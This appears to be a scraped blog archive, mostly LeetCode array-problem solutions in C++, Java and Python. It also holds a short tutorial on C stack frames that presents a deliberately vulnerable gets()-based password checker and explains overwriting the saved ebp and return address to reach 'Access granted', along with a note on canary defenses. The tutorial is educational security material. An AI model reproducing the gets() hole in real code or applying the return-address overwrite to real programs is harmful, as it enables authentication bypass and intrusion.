Sorted Array 题目大意： 给定一个排好序的数组，让你用O(1)的空间在原数组上删掉重复的元素，并返回新的长度。修改后的数组在新的长度后面可以为任意的字符。 思路： 其实就是双指针，一个指向当前不重复的位置len，另一个不断向后看不重复的就写到len的位置。 C++ 123456789101112class Solution &#123;public: int removeDuplicates(vector&lt;int&gt;&amp; nums) &#123; if(nums.empty()) return 0; int len = 1; for(int i = 1; i &lt; nums.size(); i++)&#123; if(nums[i] != nums[i - 1]) nums[len++] = nums[i]; &#125; return len; &#125;&#125;; Python 12345678910111213class Solution(object): def removeDuplicates(self, nums): &quot;&quot;&quot; :type nums: List[int] :rtype: int &quot;&quot;&quot; j = 1 if nums else 0 for i in range(1, len(nums)): if nums[i] != nums[i - 1]: nums[j] = nums[i] j += 1 return j 27. Remove Element Given an array and a value, remove all instances of that value in-place and return the new length. Do not allocate extra space for another array, you must do this by modifying the input array in-place with O(1) extra memory. The order of elements can be changed. It doesn't matter what you leave beyond the new length. Example: Given nums = [3,2,2,3], val = 3, Your function should return length = 2, with the first two elements of nums being 2. 题目地址：leetcode Remove Element 题目大意：和26题差不多，给定一个数组和一个数val，要求删除数组中值为val的，并返回新的数组长度。 思路：和上题一样，双指针。 C++ 1234567891011class Solution &#123;public: int removeElement(vector&lt;int&gt;&amp; nums, int val) &#123; int len = 0; for(int i = 0; i &lt; nums.size(); i++)&#123; if(nums[i] != val) nums[len++] = nums[i]; &#125; return len; &#125;&#125;; Python 12345678910111213class Solution(object): def removeElement(self, nums, val): &quot;&quot;&quot; :type nums: List[int] :type val: int :rtype: int &quot;&quot;&quot; j = 0 for i in range(len(nums)): if nums[i] != val: nums[j] = nums[i] j += 1 return j 88. Merge Sorted Array Given two sorted integer arrays nums1 and nums2, merge nums2 into nums1 as one sorted array. Note: You may assume that nums1 has enough space (size that is greater or equal to m + n) to hold additional elements from nums2. The number of elements initialized in nums1 and nums2 are m and n respectively. 题目地址：leetcode Merge Sorted Array 题目大意：给定两个排好序的数组num1(长度m)和nums2(长度n)，让你合并到nums1，nums1的容量&gt;= m + n 思路：开一个额外的空间，类似归并排序合并过去，空间占用O(m+n)，很简单。但是要in-place呢？不适用额外空间的话，可以倒着来。从m-1和n-1的位置比较，nums1[m-1]&gt; nums2[n-1]就把nums1[m-1]放在m + n -1的位置即可，依次类推。 C++ 123456789class Solution &#123;public: void merge(vector&lt;int&gt;&amp; nums1, int m, vector&lt;int&gt;&amp; nums2, int n) &#123; int i = m - 1, j = n - 1, cur = m + n - 1; for (; j &gt;= 0; --cur) &#123; nums1[cur] = i &gt;= 0 &amp;&amp; nums1[i] &gt; nums2[j] ? nums1[i--] : nums2[j--]; &#125; &#125;&#125;; Python 12345678910111213141516171819class Solution(object): def merge(self, nums1, m, nums2, n): &quot;&quot;&quot; :type nums1: List[int] :type m: int :type nums2: List[int] :type n: int :rtype: void Do not return anything, modify nums1 in-place instead. &quot;&quot;&quot; i, j = m - 1, n - 1 cur = m + n - 1 while j &gt;= 0: if i &gt;= 0 and nums1[i] &gt; nums2[j]: nums1[cur] = nums1[i] i -= 1 else: nums1[cur] = nums2[j] j -= 1 cur -= 1 189. 旋转数组 给定一个数组，将数组中的元素向右移动 k 个位置，其中 k 是非负数。 示例 1: 123456&gt;输入: [1,2,3,4,5,6,7] 和 k &#x3D; 3&gt;输出: [5,6,7,1,2,3,4]&gt;解释:&gt;向右旋转 1 步: [7,1,2,3,4,5,6]&gt;向右旋转 2 步: [6,7,1,2,3,4,5]&gt;向右旋转 3 步: [5,6,7,1,2,3,4] 示例 2: 12345&gt;输入: [-1,-100,3,99] 和 k &#x3D; 2&gt;输出: [3,99,-1,-100]&gt;解释: &gt;向右旋转 1 步: [99,-1,-100,3]&gt;向右旋转 2 步: [3,99,-1,-100] 说明: 尽可能想出更多的解决方案，至少有三种不同的方法可以解决这个问题。 要求使用空间复杂度为 O(1) 的 原地 算法。 方法1. 用个辅助的数组 12345678910class Solution &#123;public: void rotate(vector&lt;int&gt;&amp; nums, int k) &#123; int n = nums.size(); vector&lt;int&gt; temp(nums); for (std::size_t i = 0; i &lt; n; ++i) &#123; nums[(i + k) % n] = temp[i]; &#125; &#125;&#125;; 方法2. 数组翻转 1234[1,2,3,4,5,6,7]， K&#x3D;3为例[4,3,2,1,5,6,7] &#x2F;&#x2F;reverse(0, n - k - 1)[4,3,2,1,7,6,5] &#x2F;&#x2F;reverse(n - k, n - 1)[5,6,7,1,2,3,4] &#x2F;&#x2F;reverse(0, n - 1) c++代码如下 123456789101112131415class Solution &#123; void reverse(vector&lt;int&gt;&amp;nums, int i, int j) &#123; for (;i &lt; j; ++i, --j) &#123; swap(nums[i], nums[j]); &#125; &#125;public: void rotate(vector&lt;int&gt;&amp; nums, int k) &#123; int n = nums.size(); k %= n; reverse(nums, 0, n - k - 1); reverse(nums, n - k, n - 1); reverse(nums, 0, n - 1); &#125;&#125;; 方法3. 循环替换。 方法1中之所以要开额外的数组是因为后面的元素会被替换掉，如果采用环状的替换呢？即nums[0]和nums[k]替换，nums[k]继续和nums[2k % n]替换直到回到原点。 但是可能有的元素没有替换到，如下面的情况 123[1, 2, 3, 4] k &#x3D;2&#x3D;&gt; [1, 2, 1, 4]&#x3D;&gt; [3, 2, 1, 4] 发现元素2和元素4没有被替换到！ 那么怎么办呢？ 首先考虑循环一次回到原点经过了多少元素，假设数组走了a圈，经过了b个元素，则有an = bk， 由于a和b都是整数，an是n、k的公倍数。由于我们取的是第一次回到原点就停止遍历，因此an是n、k的最小公倍数，记为lcm(n, k)，那么遍历的元素个数为 \\(b = \\frac{an}{k}= \\frac{lcm(n,k)}{k}\\) 那么我们需要遍历\\(\\frac{n}{b} = \\frac{nk}{lcm(n,k)} = gcd(n, k)\\)，因此可以用下面的代码，当遍历gcd次的时候停止即可 123456789101112131415161718192021class Solution &#123;public: void rotate(vector&lt;int&gt;&amp; nums, int k) &#123; int n = nums.size(); k %= n; int end = gcd(n, k); for (int start = 0; start &lt; end; ++start) &#123; int i = start; int temp = nums[i]; do &#123; int next = (i + k) % n; swap(temp, nums[next]); i = next; &#125; while (i != start); &#125; &#125; int gcd(int a, int b) &#123; return b == 0 ? a : gcd(b, a % b); &#125;&#125;; 209. Minimum Size Subarray Sum Given an array of n positive integers and a positive integer s, find the minimal length of a contiguous subarray of which the sum ≥ s. If there isn't one, return 0 instead. For example, given the array [2,3,1,2,4,3] and s = 7, the subarray [4,3] has the minimal length under the problem constraint. 题目地址：leetcode Minimum Size Subarray Sum 题目大意: 给定一个正数组成的数组和一个整数s，求一个最小长度最小的子序列使得它的和&gt;=s 思路 双指针法。 C++ 12345678910111213141516171819class Solution &#123;public: int minSubArrayLen(int s, vector&lt;int&gt;&amp; nums) &#123; int start = 0; int cur_sum = 0; int ans = nums.size() + 1; for (int i = 0; i &lt; nums.size(); i++) &#123; cur_sum += nums[i]; while (cur_sum &gt;= s &amp;&amp; cur_sum - nums[start] &gt;= s &amp;&amp; start &lt;= i ) &#123; cur_sum -= nums[start++]; &#125; if (cur_sum &gt;= s &amp;&amp; ans &gt; i - start + 1) ans = i - start + 1; &#125; return ans == nums.size() + 1? 0 : ans; &#125;&#125;; Java 12345678910111213141516class Solution &#123; public int minSubArrayLen(int s, int[] nums) &#123; int start = 0; int curSum = 0; int ans = nums.length + 1; for (int i = 0; i &lt; nums.length; i++) &#123; curSum += nums[i]; while (curSum &gt;= s &amp;&amp; curSum - nums[start] &gt;= s &amp;&amp; start &lt;= i) &#123; curSum -= nums[start++]; &#125; if (curSum &gt;= s &amp;&amp; ans &gt; i - start + 1) ans = i - start + 1; &#125; return ans == nums.length + 1 ? 0 : ans; &#125;&#125; Python 1234567891011121314151617class Solution(object): def minSubArrayLen(self, s, nums): &quot;&quot;&quot; :type s: int :type nums: List[int] :rtype: int &quot;&quot;&quot; ans = len(nums) + 1 cur_sum = start = 0 for i in range(len(nums)): cur_sum += nums[i] while cur_sum &gt;= s and cur_sum - nums[start] &gt;= s and start &lt;= i: cur_sum -= nums[start] start += 1 if cur_sum &gt;= s and i - start + 1 &lt; ans: ans = i - start + 1 return ans if ans != len(nums) + 1 else 0 228. Summary Ranges You are given a sorted unique integer array nums. Return the smallest sorted list of ranges that cover all the numbers in the array exactly. That is, each element of nums is covered by exactly one of the ranges, and there is no integer x such that x is in one of the ranges but not in nums. Each range [a,b] in the list should be output as: \"a-&gt;b\" if a != b \"a\" if a == b Example 1: 123456&gt;Input: nums &#x3D; [0,1,2,4,5,7]&gt;Output: [&quot;0-&gt;2&quot;,&quot;4-&gt;5&quot;,&quot;7&quot;]&gt;Explanation: The ranges are:&gt;[0,2] --&gt; &quot;0-&gt;2&quot;&gt;[4,5] --&gt; &quot;4-&gt;5&quot;&gt;[7,7] --&gt; &quot;7&quot; Example 2: 1234567&gt;Input: nums &#x3D; [0,2,3,4,6,8,9]&gt;Output: [&quot;0&quot;,&quot;2-&gt;4&quot;,&quot;6&quot;,&quot;8-&gt;9&quot;]&gt;Explanation: The ranges are:&gt;[0,0] --&gt; &quot;0&quot;&gt;[2,4] --&gt; &quot;2-&gt;4&quot;&gt;[6,6] --&gt; &quot;6&quot;&gt;[8,9] --&gt; &quot;8-&gt;9&quot; Example 3: 12&gt;Input: nums &#x3D; []&gt;Output: [] Example 4: 12&gt;Input: nums &#x3D; [-1]&gt;Output: [&quot;-1&quot;] Example 5: 12&gt;Input: nums &#x3D; [0]&gt;Output: [&quot;0&quot;] Constraints: 0 &lt;= nums.length &lt;= 20 -231 &lt;= nums[i] &lt;= 231 - 1 All the values of nums are unique. nums is sorted in ascending order. 每次遍历直到nums[j] != nums[j - 1]的时候就是一个区间 123456789101112131415161718class Solution &#123;public: vector&lt;string&gt; summaryRanges(vector&lt;int&gt;&amp; nums) &#123; vector&lt;string&gt; ans; for (int i = 0; i &lt; nums.size();) &#123; int j = i + 1; while (j &lt; nums.size() &amp;&amp; nums[j] == nums[j - 1] + 1) ++j; --j; if (i != j) ans.emplace_back(to_string(nums[i]) + &quot;-&gt;&quot; + to_string(nums[j])); else ans.emplace_back(to_string(nums[j])); i = j + 1; &#125; return ans; &#125;&#125;; 238. Product of Array Except Self Given an array of n integers where n &gt; 1, nums, return an array output such that output[i] is equal to the product of all the elements of nums except nums[i]. Solve it without division and in O(n). For example, given [1,2,3,4], return [24,12,8,6]. Follow up: Could you solve it with constant space complexity? (Note: The output array does not count as extra space for the purpose of space complexity analysis.) 题目地址：leetcode Product of Array Except Self 题目大意： 给定一个数组，对于每个元素求除了该元素的其他数的乘积。要求不用除法、时间复杂度O(1) follow up: 要求空间复杂度O(1) ，这里不包括返回的数组空间。 思路 容易想到就是所有数的乘积然后除以每个数，就得到了答案。但是要求不用除法，因此可以： 分为left和right。left[i]代表i左边乘积（不包括i），right[i]代表i右边乘积（不包括i）。 容易写出： C++ 123456789101112131415161718class Solution &#123;public: vector&lt;int&gt; productExceptSelf(vector&lt;int&gt;&amp; nums) &#123; if (nums.empty()) return nums; vector&lt;int&gt; ans(nums.size(), 0),left(nums.size(), 1),right(nums.size(), 1); for (int i = 1; i &lt; nums.size(); i++) left[i] = nums[i - 1] * left[i - 1]; for (int i = nums.size() - 2; i &gt;= 0; i--) right[i] = nums[i + 1] * right[i + 1]; for (int i = 1; i &lt; nums.size() - 1; i++) ans[i] = left[i] * right[i]; ans[0] = right[0]; ans[nums.size() - 1] = left[nums.size() - 1]; return ans; &#125;&#125;; 但可以做得更好。 我们可以用一个数组搞定，而这个数组就是答案，不计算额外的空间。 首先ans[i]代表i左边元素的乘积，遍历一遍后。然后从右向左遍历。每次用一个变量t * nums[i]，得到右边的乘积。 C++ 12345678910111213141516class Solution &#123;public: vector&lt;int&gt; productExceptSelf(vector&lt;int&gt;&amp; nums) &#123; if (nums.empty()) return nums; vector&lt;int&gt; ans(nums.size(), 1); for (int i = 1; i &lt; nums.size(); i++) ans[i] = nums[i - 1] * ans[i - 1]; int t = nums[nums.size()-1]; for (int i = nums.size() - 2; i &gt;= 0; i--) &#123; ans[i] *= t; t *= nums[i]; &#125; return ans; &#125;&#125;; Java 123456789101112131415161718class Solution &#123; public int[] productExceptSelf(int[] nums) &#123; if (nums.length == 0) return nums; int[] ans = new int[nums.length]; Arrays.fill(ans, 1); for (int i = 1; i &lt; nums.length; i++) ans[i] = ans[i-1] * nums[i-1]; int t = nums[nums.length-1]; for(int i= nums.length-2;i&gt;=0;i--)&#123; ans[i] *= t; t *= nums[i]; &#125; return ans; &#125;&#125; Python 123456789101112131415161718class Solution(object): def productExceptSelf(self, nums): &quot;&quot;&quot; :type nums: List[int] :rtype: List[int] &quot;&quot;&quot; if not nums: return nums ans = [1] * len(nums) for i in range(1, len(nums)): ans[i] = ans[i - 1] * nums[i - 1] t = nums[-1] for i in range(len(nums) - 2, -1, -1): ans[i] *= t t *= nums[i] return ans 674. 最长连续递增序列 给定一个未经排序的整数数组，找到最长且 连续递增的子序列，并返回该序列的长度。 连续递增的子序列 可以由两个下标 l 和 r（l &lt; r）确定，如果对于每个 l &lt;= i &lt; r，都有 nums[i] &lt; nums[i + 1] ，那么子序列 [nums[l], nums[l + 1], ..., nums[r - 1], nums[r]] 就是连续递增子序列。 示例 1： 1234&gt;输入：nums &#x3D; [1,3,5,4,7]&gt;输出：3&gt;解释：最长连续递增序列是 [1,3,5], 长度为3。&gt;尽管 [1,3,5,7] 也是升序的子序列, 但它不是连续的，因为 5 和 7 在原数组里被 4 隔开。 示例 2： 123&gt;输入：nums &#x3D; [2,2,2,2,2]&gt;输出：1&gt;解释：最长连续递增序列是 [2], 长度为1。 提示： 0 &lt;= nums.length &lt;= 104 -109 &lt;= nums[i] &lt;= 109 直接找不解释。。 12345678910111213141516class Solution &#123;public: int findLengthOfLCIS(vector&lt;int&gt;&amp; nums) &#123; if (nums.empty()) return 0; std::size_t ans = 0; for (std::size_t i = 0; i &lt; nums.size();) &#123; std::size_t j = i + 1; while (j &lt; nums.size() &amp;&amp; nums[j - 1] &lt; nums[j]) &#123; ++j; &#125; ans = std::max(ans, j - i); i = j; &#125; return ans; &#125;&#125;; 713. Subarray Product Less Than K Your are given an array of positive integers nums. Count and print the number of (contiguous) subarrays where the product of all the elements in the subarray is less than k. Example 1: 12345**Input:** nums &#x3D; [10, 5, 2, 6], k &#x3D; 100**Output:** 8**Explanation:** The 8 subarrays that have product less than 100 are: [10], [5], [2], [6], [10, 5], [5, 2], [2, 6], [5, 2, 6].Note that [10, 5, 2] is not included as the product of 100 is not strictly less than k. Note: 0 &lt; nums.length &lt;= 50000. 0 &lt; nums[i] &lt; 1000. 0 &lt;= k &lt; 10^6. 题目地址：leetcode Subarray Product Less Than K 题目大意: 给定一个正数组成的数组，求有多少个乘积小于k的连续的子数组。 思路： 滑动窗口O(n) 我的做法是，start到第一个不满足乘积小于k的位置i，则[start,i-1]以start开头有i - start个子数组，然后/ nums[start]，start+=1，继续看是不是满足条件。 注意需要看nums[i] 是否已经&gt;= k了。 C++ 12345678910111213141516171819202122232425class Solution &#123;public: int numSubarrayProductLessThanK(vector&lt;int&gt;&amp; nums, int k) &#123; if(nums.empty()) return 0; int mul = 1, start = 0, ans = 0; for( int i = 0; i &lt; nums.size(); i++)&#123; if(nums[i] &gt;= k)&#123; ans += ((i - start + 1) * (i - start)) &gt;&gt; 1; start = i + 1; mul = 1; continue; &#125; while(mul * nums[i] &gt;= k &amp;&amp; start &lt;= i)&#123; ans += i - start; mul /= nums[start++]; &#125; mul *= nums[i]; &#125; for( ; mul &lt; k &amp;&amp; start &lt; nums.size(); start++)&#123; ans += nums.size() - start; &#125; return ans; &#125;&#125;; 官方的Solution思路类似，但是写得更好： 我上面的其实是以start开头的有多少种，而官方的是以end结尾的有多少种。 C++ 12345678910111213class Solution &#123;public: int numSubarrayProductLessThanK(vector&lt;int&gt;&amp; nums, int k) &#123; if(nums.empty() k &lt;= 1) return 0; int mul = 1, start = 0, ans = 0; for( int end = 0; end &lt; nums.size(); end++)&#123; mul *= nums[end]; while(mul &gt;= k) mul /= nums[start++]; ans += end - start + 1; &#125; return ans; &#125;&#125;; Java 123456789101112class Solution &#123; public int numSubarrayProductLessThanK(int[] nums, int k) &#123; if(k &lt;= 1) return 0; int mul = 1, start = 0, ans = 0; for(int end = 0; end &lt; nums.length; end++)&#123; mul *= nums[end]; while(mul &gt;= k) mul /= nums[start++]; ans += end - start + 1; &#125; return ans; &#125;&#125; Python 1234567891011121314151617class Solution(object): def numSubarrayProductLessThanK(self, nums, k): &quot;&quot;&quot; :type nums: List[int] :type k: int :rtype: int &quot;&quot;&quot; if k &lt;= 1: return 0 start = ans = 0 mul = 1 for end in range(len(nums)): mul *= nums[end] while mul &gt;= k: mul /= nums[start] start += 1 ans += end - start + 1 return ans 717. 1-bit and 2-bit Characters We have two special characters. The first character can be represented by one bit 0. The second character can be represented by two bits (10 or 11). Now given a string represented by several bits. Return whether the last character must be a one-bit character or not. The given string will always end with a zero. Example 1: 123456**Input:** bits &#x3D; [1, 0, 0]**Output:** True**Explanation:** The only way to decode it is two-bit character and one-bit character. So the last character is one-bit character. Example 2: 123456**Input:** bits &#x3D; [1, 1, 1, 0]**Output:** False**Explanation:** The only way to decode it is two-bit character and two-bit character. So the last character is NOT one-bit character. Note: 1 &lt;= len(bits) &lt;= 1000. bits[i] is always 0 or 1. 题目地址：leetcode 1-bit and 2-bit Characters 题目大意： 给定一个数组，只能由0、 10或者11组成，问最后一个字符是否只能是单个字符组成的 思路：从前往后扫描，碰到1的+2，碰到0的+1，到倒数第二个字符看是否为1即可。 C++ 12345678910111213class Solution &#123;public: bool isOneBitCharacter(vector&lt;int&gt;&amp; bits) &#123; int i = 0; for(; i &lt; bits.size(); i++)&#123; if(bits[i] == 1)&#123; if(i == bits.size() - 2) return false; i++; &#125; &#125; return true; &#125;&#125;; 798. Smallest Rotation with Highest Score Given an array A, we may rotate it by a non-negative integer K so that the array becomes A[K], A[K+1], A{K+2], ... A[A.length - 1], A[0], A[1], ..., A[K-1]. Afterward, any entries that are less than or equal to their index are worth 1 point. For example, if we have [2, 4, 1, 3, 0], and we rotate by K = 2, it becomes [1, 3, 0, 2, 4]. This is worth 3 points because 1 &gt; 0 [no points], 3 &gt; 1 [no points], 0 &lt;= 2 [one point], 2 &lt;= 3 [one point], 4 &lt;= 4 [one point]. Over all possible rotations, return the rotation index K that corresponds to the highest score we could receive. If there are multiple answers, return the smallest such index K. Example 1: Input: [2, 3, 1, 4, 0] Output: 3 Explanation: Scores for each K are listed below: K = 0, A = [2,3,1,4,0], score 2 K = 1, A = [3,1,4,0,2], score 3 K = 2, A = [1,4,0,2,3], score 3 K = 3, A = [4,0,2,3,1], score 4 K = 4, A = [0,2,3,1,4], score 3 So we should choose K = 3, which has the highest score. Example 2: Input: [1, 3, 0, 2, 4] Output: 0 Explanation: A will always have 3 points no matter how it shifts. So we will choose the smallest K, which is 0. Note: A will have length at most 20000. A[i] will be in the range [0, A.length]. 题目地址：leetcode Smallest Rotation with Highest Score 题目大意：给定一个数组A，当A[i] &lt;= i的时候得一分。现在让你进行循环左移，求能获得的最高分的次数。 思路： 当我们进行循环左移的时候，原本下标为0的元素变到n - 1，因为所有元素都&lt;=N - 1，因此肯定有分数+1 而我们需要做的事就是记录各个元素移动多少步之后分数-1 k = (i - A[i] + n) % n可以算出A[i]==i的元素下标，要是移动超过k步，就说明score应该-1 统计各个数字的k即可 PS: 我们并不关心一开始是多少分，只关心最后谁最大即可。因此对于每个元素不用看最开始是否能得分，就看什么时候加分什么时候减分就行了。 参考https://leetcode.com/problems/smallest-rotation-with-highest-score/discuss/118725/Easy-and-Concise-5-lines-Solution-C++JavaPython C++ 123456789101112class Solution &#123;public: int bestRotation(vector&lt;int&gt;&amp; A) &#123; int n = A.size(); vector&lt;int&gt; score(n, 0); for (int i = 0; i &lt; n; ++i) --score[(i + n - A[i] + 1) % n]; for (int i = 1; i &lt; n; ++i) score[i] += score[i - 1] + 1; return distance(score.begin(), max_element(score.begin(), score.end())); &#125;&#125;; Python 12345678910111213class Solution(object): def bestRotation(self, A): &quot;&quot;&quot; :type A: List[int] :rtype: int &quot;&quot;&quot; n = len(A) score = [0] * n for i in range(n): score[(i + n - A[i] + 1) % n] -= 1 for i in range(1, n): score[i] += score[i - 1] + 1 return score.index(max(score)) 1128. 等价多米诺骨牌对的数量 难度简单109 给你一个由一些多米诺骨牌组成的列表 dominoes。 如果其中某一张多米诺骨牌可以通过旋转 0 度或 180 度得到另一张多米诺骨牌，我们就认为这两张牌是等价的。 形式上，dominoes[i] = [a, b] 和 dominoes[j] = [c, d] 等价的前提是 a==c 且 b==d，或是 a==d 且 b==c。 在 0 &lt;= i &lt; j &lt; dominoes.length 的前提下，找出满足 dominoes[i] 和 dominoes[j] 等价的骨牌对 (i, j) 的数量。 示例： 12&gt;输入：dominoes &#x3D; [[1,2],[2,1],[3,4],[5,6]]&gt;输出：1 提示： 1 &lt;= dominoes.length &lt;= 40000 1 &lt;= dominoes[i][j] &lt;= 9 由于数据是1~9之间的，因此可以映射为100以内的两位数，然后计数即可。 123456789101112131415161718192021class Solution &#123;public: int numEquivDominoPairs(vector&lt;vector&lt;int&gt;&gt;&amp; dominoes) &#123; vector&lt;int&gt; counter(100, 0); for (vector&lt;int&gt;&amp; row : dominoes) &#123; if (row[1] &lt; row[0]) &#123; std::swap(row[0], row[1]); &#125; int key = row[0] * 10 + row[1]; ++counter[key]; &#125; int ans = 0; for (std::size_t i = 0; i &lt; counter.size(); ++i) &#123; if (counter[i] &gt; 1) &#123; ans += (counter[i] * (counter[i] - 1)) &gt;&gt; 1; &#125; &#125; return ans; &#125;&#125;; 更多题解可以查看： https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"C语言函数调用过程 | 缓冲区溢出攻击","slug":"understanding-stack-frame-of-function-call-and-buffer-overflow-attack","date":"2016-10-03T18:30:22.000Z","updated":"2021-01-08T13:42:14.035Z","comments":true,"path":"understanding-stack-frame-of-function-call-and-buffer-overflow-attack/","link":"","permalink":"https://www.hrwhisper.me/understanding-stack-frame-of-function-call-and-buffer-overflow-attack/","excerpt":"C语言的函数调用过程是怎么样的呢？如何传递参数？运行后如何从函数跳转回来？","text":"C语言的函数调用过程是怎么样的呢？如何传递参数？运行后如何从函数跳转回来？ 利用栈的函数调用方式 在函数调用时，按如下的顺序压入栈： • 函数的参数（按声明的逆序即从右到左的顺序，当然有的编译器采用的是正序） • 函数的返回值（开辟一个空间） • 函数的返回地址（使得调用完成后，eip能正确指向下一条指令） • ebp的值（记录函数调用前的栈底，用于调用结束后恢复原来地址） 下面举例说明main函数调用fun的过程。 调用前 在调用前，首先栈中存放了ebp，用于本程序执行完成后，ebp能回到原来的位置。 然后将局部变量4和5入栈。 before-function-calls 调用时 函数参数入栈，这里入栈的顺序和参数的声明顺序相反 接着开辟个空间，用于存放返回值 func函数执行后的返回地址压入栈 跳转到函数执行 ebp地址入栈 ebp = esp (mov ebp,esp) during-function-calls 调用结束，要返回时 函数返回栈如下，将返回地址写入返回值的栈中。 123mov esp,ebp ;恢复ESP 同时回收局部变量等空间pop ebp ;从栈中恢复保存的ebp值ret ;从占中得到返回地址，并跳转到该位置 end-of-function-calls Attack 实验 我们可以通过栈溢出覆盖返回地址，来达到攻击。比如如下的代码，我们希望输入非goodpass，但是能通过验证。这里是（Access granted） 123456789101112131415161718192021#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;stdlib.h&gt;bool IsPasswordOkay(void) &#123; char Password[12]; gets(Password); if (!strcmp(Password, &quot;goodpass&quot;)) return(true); else return(false);&#125;void main(void) &#123; bool PwStatus; puts(&quot;Enter password:&quot;); PwStatus = IsPasswordOkay(); if (PwStatus == false) &#123; puts(&quot;Access denied&quot;); exit(-1); &#125; else puts(&quot;Access granted&quot;);&#125; 查看返回地址和ebp 由汇编看到puts(\"Access granted\"); 地址为 0x004010DD 同时，查看其ebp地址为0x0012ff80 输入编辑 由于Password数组长度为12，因此要进行溢出攻击，首先要把它填满，输入任意字符到12个为止。接着，输入ebp的地址，然后在输入返回地址。 edit-input-to-attack 攻击测试 打开CMD，使用重定向输入，并运行该程序，即出现了Access granted. PS:上述的程序中， 要是没有设置正确的EBP值（随便设置一个）那么也可以出现access granted，但是程序会报错退出。 此外，还有return-into-libc的攻击方式。 防御措施-Canary Canary（金丝雀）技术是一种用来检测和阻止栈溢出攻击的机制，在运行时为程序提供安全保护。 它一般由编译器实施，在程序运行时在被保护的栈中插入一个难以伪造的值canary （一般为一个32位的随机值，也称为cookie或guard），canary值将在函数返回时被进行检查，如果其被修改则认为发生了溢出。 canary-protect","categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"信息安全","slug":"study/信息安全","permalink":"https://www.hrwhisper.me/categories/study/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://www.hrwhisper.me/tags/C/"}]},{"title":"leetcode 389~399 solution","slug":"leetcode-389-399-solution","date":"2016-09-20T14:22:30.000Z","updated":"2021-01-08T13:32:16.890Z","comments":true,"path":"leetcode-389-399-solution/","link":"","permalink":"https://www.hrwhisper.me/leetcode-389-399-solution/","excerpt":"本次题解包括: 389 Find the Difference 390 Elimination Game 391 Perfect Rectangle 392 Is Subsequence 393 UTF-8 Validation 394 Decode String 395 Longest Substring with At Least K Repeating Characters 396 Rotate Function 397 Integer Replacement 398 Random Pick Index 399 Evaluate Division","text":"本次题解包括: 389 Find the Difference 390 Elimination Game 391 Perfect Rectangle 392 Is Subsequence 393 UTF-8 Validation 394 Decode String 395 Longest Substring with At Least K Repeating Characters 396 Rotate Function 397 Integer Replacement 398 Random Pick Index 399 Evaluate Division Find the Difference Given two strings s and t which consist of only lowercase letters. String t is generated by random shuffling string s and then add one more letter at a random position. Find the letter that was added in t. Example: 123456789Input:s &#x3D; &quot;abcd&quot;t &#x3D; &quot;abcde&quot;Output:eExplanation:&#39;e&#39; is the letter that was added. 传送门：leetcode Find the Difference 题意：给定只包含小写字母的两个字符串s和t，t是将s随机打乱并添加一个字母x组成。字母x 思路： 直接计数 看看不相等的即可。 当然python可以 one line 12345678class Solution(object): def findTheDifference(self, s, t): &quot;&quot;&quot; :type s: str :type t: str :rtype: str &quot;&quot;&quot; return list((collections.Counter(t) - collections.Counter(s)).keys())[0] 390. Elimination Game There is a list of sorted integers from 1 to n. Starting from left to right, remove the first number and every other number afterward until you reach the end of the list. Repeat the previous step again, but this time from right to left, remove the right most number and every other number from the remaining numbers. We keep repeating the steps again, alternating left to right and right to left, until a single number remains. Find the last number that remains starting with a list of length n. Example: 123456789Input:n &#x3D; 9,1 2 3 4 5 6 7 8 92 4 6 82 66Output:6 传送门：leetcode Elimination Game 题意：给定一个数n，要求每次轮流从左到右、从右到左删除剩下的数（间隔一个删除一个），求最后剩下的数 思路：用链表模拟的话O(nlogn)，但是可以直接计算出每次开头和结尾的地方，复杂度O(logn) 注意到每次删除上一轮之后，可以看成是下一次的步长step *= 2（初始为2，所以删除1，3，5，7....） 记录左右两个端点left和right， 若是从左到右，发现 left + (right - left) // step * step == right，则需要更新右端点。 若从右到左，right - (right - left) // step * step == left 则更新左端点。 上面的//是整除的意思 Python 1234567891011121314151617181920212223class Solution(object): def lastRemaining(self, n): &quot;&quot;&quot; :type n: int :rtype: int &quot;&quot;&quot; left, right = 1, n remain = n step = 2 left_to_right = True while remain != 1: if left_to_right: if left + (right - left) // step * step == right: right -= (step &gt;&gt; 1) left += (step &gt;&gt; 1) else: if right - (right - left) // step * step == left: left += (step &gt;&gt; 1) right -= (step &gt;&gt; 1) remain &gt;&gt;= 1 step &lt;&lt;= 1 left_to_right = not left_to_right return right if left_to_right else left 391. Perfect Rectangle Given N axis-aligned rectangles where N &gt; 0, determine if they all together form an exact cover of a rectangular region. Each rectangle is represented as a bottom-left point and a top-right point. For example, a unit square is represented as [1,1,2,2]. (coordinate of bottom-left point is (1, 1) and top-right point is (2, 2)). Example 1: 123456789rectangles &#x3D; [[1,1,3,3],[3,1,4,2],[3,2,4,4],[1,3,2,4],[2,3,3,4]]Return true. All 5 rectangles together form an exact cover of a rectangular region. Example 2: 12345678rectangles &#x3D; [&gt;[1,1,2,3],[1,3,2,4],[3,1,4,2],[3,2,4,4]]Return false. Because there is a gap between the two rectangular regions. Example 3: 12345678rectangles &#x3D; [&gt;[1,1,3,3],[3,1,4,2],[1,3,2,4],[3,2,4,4]]Return false. Because there is a gap in the top center. Example 4: 123456789rectangles &#x3D; [&gt;[1,1,3,3],[3,1,4,2],[1,3,2,4],[2,2,4,4]]Return false. Because two of the rectangles overlap with each other. 传送门：leetcode Perfect Rectangle 题意：给定一些矩形，求这些矩形是否能恰好组成一个矩形面积。 思路： 合法的矩形区域有什么条件呢？ 参考 https://discuss.leetcode.com/topic/55923/o-n-solution-by-counting-corners-with-detailed-explaination 0_1472399247817_perfect_rectangle.jpg 上图中蓝色的点只能出现1次 绿色的点有2个矩形的某个顶点一致 红色的有4个矩形某个顶点一致 首先，遍历所有的矩形，对其四个端点进行编号（左下1，右下2，右上4，左上8，编号为1，2，4，8是为了方便位运算）。然后对于每个点（比如左上角），如果在之前的矩形中，同样也是作为左上角出现，那么说明重复了，返回False。具体的操作是用位运算(看下面的check函数) 最后判断蓝色的点是否为4个，还有总面积是否相等。 Python 12345678910111213141516171819202122232425262728293031class Solution(object): def isRectangleCover(self, rectangles): 